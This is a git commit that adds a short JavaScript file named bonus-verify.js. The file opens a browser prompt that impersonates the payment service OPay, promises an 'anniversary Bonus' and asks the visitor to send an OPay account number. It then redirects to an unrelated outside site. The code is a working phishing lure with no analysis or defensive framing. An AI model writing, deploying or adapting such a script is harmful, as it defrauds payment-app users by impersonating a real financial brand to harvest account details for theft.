0d2e7dd875630a1e91bb44f2f78359222ceeef66
newblog13 <sweet16guyz@gmail.com>
2026-05-13 14:30:14 +0100

    Create bonus-verify.js

---
+++ bonus-verify.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW BONUS'
+password=prompt('OPay: Congratulations, You are eligible to receive OPay anniversary Bonus, click OK to Send us your OPay Account Number','WITHDRAW BONUS');
+if (password != 'WITHDRAW BONUS') {
+location.href='https://phivez.org/8years-anniversary.html';
+}
